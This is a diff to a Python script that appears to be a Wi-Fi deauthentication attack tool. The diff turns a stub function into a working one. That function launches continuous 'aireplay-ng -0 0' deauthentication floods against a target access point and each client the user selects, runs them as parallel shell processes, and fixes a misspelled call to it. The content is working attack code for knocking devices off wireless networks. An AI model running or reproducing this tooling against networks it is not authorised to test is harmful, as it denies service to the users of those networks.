@@ -5,6 +5,19 @@ import subprocess, re, time, csv, os, copy
 import clients , targets, mac
 from color import Color
 
+def deauth(BSSID, channel, interface, selected_list):
+	try:
+		commands = []
+		for client in selected_list:		
+			commands.append("aireplay-ng -0 0 -a "+BSSID+" -c"+client.station+" " + interface)
+		procs = [subprocess.Popen(i, shell = True) for i in commands]
+		for p in procs:
+			p.wait()	
+	except KeyboardInterrupt:
+		Color.pl("\n \n {G}Thank {B}You {O}For {R}Using {P}My {C}Script")
+		time.sleep(2)
+		return
+
 def initialization():
 
 	#check for root privilege
@@ -62,7 +75,8 @@ def initialization():
 	selected_list = select(target.bssid, target.channel, interface, client_list)
 	Color.pl("{B} Starting deAuth request: {W}")
 	time.sleep(1)
-	death(target.bssid, target.channel, interface, selected_list)
+	deauth(target.bssid, target.channel, interface, selected_list)
+
 
 
 def selectRemoveConnect(BSSID, channel, interface, client_list):
@@ -118,8 +132,8 @@ def select(BSSID, channel, interface, client_list):
 		Color.pl("{!}  {R}Error: Invalid entry")
 
 
-def deauth(BSSID, channel, interface, selected_list):
-	return
 
 
 initialization()
+#deauth(1,2,3,4)
+
